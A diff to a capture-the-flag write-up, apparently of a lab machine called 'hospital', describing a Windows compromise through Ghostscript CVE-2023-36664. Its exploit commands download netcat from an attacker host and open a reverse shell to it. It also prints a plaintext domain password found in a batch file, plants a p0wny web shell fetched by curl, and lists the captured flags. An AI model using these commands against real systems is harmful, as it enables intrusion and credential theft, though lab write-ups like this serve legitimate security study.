@@ -169,10 +169,26 @@ so i need to download the netcat(https://github.com/int0x33/nc.exe/)
 I need to send 2 file,first injects to download from my machine the nc64.exe, the second triggers to reverse shell back to mean
 
     1)python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.120:80/nc64.exe -o nc.exe" --filename file.eps
-    2)python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.16.120 4444 -e cmd.exe" --filename nc64.exe
+    2)python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.16.120 4444 -e cmd.exe" --filename file.eps
 
 and i got the windows reverse shell
 
 cd Desktop and there is the userflag.txt:
     7ed66a96c08bd8f3c89a52250f509a41
 
+in c:\Users\drbrown.HOSPITAL\Documents present file ghostscript.bat so i looked inside using type:
+    @echo off
+set filename=%~1
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
+
+insinde the c:\xampp\htdocs there is a file name shell.php
+
+so i change the content of it to content of p0wny-shell.php to get a shell with NT authority permissions
+
+so i downloaded a p0wny-shell.php using curl 10.10.16.120:/p0wny-shell.php -o shell.php and enter it using browser :
+    https://hospital.htb/shell.php
+
+and here i got an admin permissions
+
+going to C:\Users\Administrator\Desktop and get the flag:
+    633deb533d5bc0aecd0517ea3ee0edc8
